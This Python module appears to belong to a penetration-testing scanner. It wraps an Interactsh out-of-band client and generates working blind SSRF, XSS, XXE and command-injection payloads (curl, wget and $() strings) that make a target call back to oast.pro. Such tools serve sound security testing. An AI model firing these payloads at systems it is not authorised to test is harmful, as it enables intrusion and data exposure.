"""
AmonStrike — Interactsh OOB Client
Out-of-band detection for blind vulnerabilities.

Used for: blind SSRF, blind XSS, blind SQLi, blind RCE, XXE OOB.
Without OOB you miss 40% of vulnerabilities.

Uses ProjectDiscovery's interactsh-client or their public server.
"""
import os
import re
import uuid
import time
import json
import socket
import subprocess
import threading
import requests
from datetime import datetime


class InteractshClient:
    """
    Manages an OOB (Out-of-Band) interaction URL for blind vulnerability detection.

    Usage:
        oob = InteractshClient()
        oob.start()
        url = oob.get_url()          # Use in payloads
        hostname = oob.get_hostname() # Use in DNS payloads
        time.sleep(10)
        hits = oob.get_hits()        # Did target DNS/HTTP us?
    """

    PUBLIC_SERVER = "oast.pro"  # ProjectDiscovery public interactsh
    ALT_SERVER    = "oast.fun"

    def __init__(self, server: str = None, token: str = None):
        self.server    = server or os.environ.get("INTERACTSH_SERVER", self.PUBLIC_SERVER)
        self.token     = token  or os.environ.get("INTERACTSH_TOKEN", "")
        self._id       = str(uuid.uuid4()).replace("-","")[:16].lower()
        self._hits     = []
        self._polling  = False
        self._thread   = None
        self._session  = requests.Session()

        # Try to register with server
        self._correlation_id = None
        self._secret_key     = None
        self._registered     = self._register()

    def _register(self) -> bool:
        """Register with interactsh server for correlation."""
        try:
            r = self._session.post(
                f"https://{self.server}/register",
                json={"public-key": self._id, "secret-key": self._id},
                headers={"Authorization": self.token} if self.token else {},
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                self._correlation_id = data.get("correlation-id", self._id)
                return True
        except Exception:
            pass
        # Fallback: use ID-based hostname without registration
        self._correlation_id = self._id
        return False

    def get_url(self) -> str:
        """Get HTTP interaction URL."""
        return f"http://{self._correlation_id}.{self.server}"

    def get_https_url(self) -> str:
        return f"https://{self._correlation_id}.{self.server}"

    def get_hostname(self) -> str:
        """Get DNS interaction hostname."""
        return f"{self._correlation_id}.{self.server}"

    def get_dns_payload(self) -> str:
        """XXE DNS exfil payload."""
        return f"http://{self._correlation_id}.{self.server}"

    def start_polling(self, interval: int = 5):
        """Start background polling for interactions."""
        self._polling = True
        self._thread  = threading.Thread(target=self._poll_loop,
                                         args=(interval,), daemon=True)
        self._thread.start()

    def _poll_loop(self, interval: int):
        while self._polling:
            self._poll()
            time.sleep(interval)

    def _poll(self):
        """Poll server for new interactions."""
        try:
            r = self._session.get(
                f"https://{self.server}/poll",
                params={"id": self._correlation_id, "secret": self._id},
                headers={"Authorization": self.token} if self.token else {},
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                for interaction in data.get("data", []):
                    hit = {
                        "type":      interaction.get("protocol",""),
                        "remote_ip": interaction.get("remote-address",""),
                        "timestamp": interaction.get("timestamp",""),
                        "raw":       interaction.get("raw-request","")[:500],
                    }
                    if hit not in self._hits:
                        self._hits.append(hit)
        except Exception:
            pass

    def stop(self):
        self._polling = False

    def get_hits(self, wait: int = 5) -> list:
        """Get all recorded interactions. Optionally wait for late ones."""
        if wait:
            time.sleep(wait)
        self._poll()
        return list(self._hits)

    def has_hit(self, wait: int = 5) -> bool:
        """Simple check: did anyone interact?"""
        return len(self.get_hits(wait)) > 0

    def last_hit(self) -> dict:
        hits = self.get_hits(wait=0)
        return hits[-1] if hits else {}


class OOBDetector:
    """
    High-level OOB detection for specific vulnerability types.
    Wraps InteractshClient with module-specific helpers.
    """

    def __init__(self):
        self.client = InteractshClient()
        self.url     = self.client.get_url()
        self.host    = self.client.get_hostname()
        self.client.start_polling()

    def ssrf_payloads(self) -> list:
        """SSRF payloads pointing to OOB server."""
        return [
            self.url,
            self.url + "/ssrf-probe",
            f"http://{self.host}/",
            f"http://{self.host}:80/",
        ]

    def xss_payload(self) -> str:
        """Blind XSS payload that fires OOB request."""
        return (
            f'"><script src="{self.url}/xss.js"></script>'
            f'<img src="{self.url}/xss-img" onerror="this.src=\'{self.url}/err\'"/>'
        )

    def xxe_payloads(self) -> list:
        """XXE payloads for OOB exfiltration."""
        return [
            f'''<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{self.url}/xxe">]>
<root><data>&xxe;</data></root>''',
            f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "{self.url}/xxe.dtd">
  %remote;
]>
<root/>''',
        ]

    def dns_lookup_payload(self) -> str:
        """Payload that triggers DNS lookup."""
        return self.host

    def rce_payloads(self) -> list:
        """RCE payloads that make OOB DNS/HTTP requests."""
        return [
            f"curl {self.url}/rce",
            f"wget {self.url}/rce",
            f"nslookup {self.host}",
            f"ping -c1 {self.host}",
            f"`curl {self.url}/rce`",
            f"$(curl {self.url}/rce)",
        ]

    def check(self, wait: int = 8) -> dict:
        """Check for any OOB interactions."""
        hits = self.client.get_hits(wait)
        return {
            "has_hit": bool(hits),
            "hits":    hits,
            "url":     self.url,
            "host":    self.host,
        }

    def stop(self):
        self.client.stop()


def run_regression_tests():
    print("\n=== INTERACTSH OOB REGRESSION TESTS ===")
    passed = failed = 0
    oob = InteractshClient()

    tests = [
        ("Client instantiates",
         lambda: isinstance(oob, InteractshClient)),

        ("Has correlation ID",
         lambda: len(oob._correlation_id) >= 8),

        ("URL generated correctly",
         lambda: oob.get_url().startswith("http://")),

        ("Hostname in URL",
         lambda: oob._correlation_id in oob.get_url()),

        ("HTTPS URL works",
         lambda: oob.get_https_url().startswith("https://")),

        ("DNS hostname valid",
         lambda: "." in oob.get_hostname()),

        ("Get hits returns list",
         lambda: isinstance(oob.get_hits(wait=0), list)),

        ("has_hit returns bool",
         lambda: isinstance(oob.has_hit(wait=0), bool)),

        ("OOBDetector instantiates",
         lambda: isinstance(OOBDetector(), OOBDetector)),

        ("SSRF payloads generated",
         lambda: len(OOBDetector().ssrf_payloads()) >= 2),

        ("XSS payload has script tag",
         lambda: "script" in OOBDetector().xss_payload()),

        ("XXE payloads generated",
         lambda: len(OOBDetector().xxe_payloads()) >= 2),

        ("RCE payloads generated",
         lambda: len(OOBDetector().rce_payloads()) >= 4),

        ("Check returns dict with has_hit",
         lambda: "has_hit" in OOBDetector().check(wait=0)),
    ]

    for name, fn in tests:
        try:
            if fn():
                passed += 1
                print(f"  ✓ {name}")
            else:
                failed += 1
                print(f"  ✗ {name}")
        except Exception as e:
            failed += 1
            print(f"  ✗ {name} — {e}")

    print(f"\n  Passed: {passed}  Failed: {failed}")
    return passed, failed


if __name__ == "__main__":
    run_regression_tests()
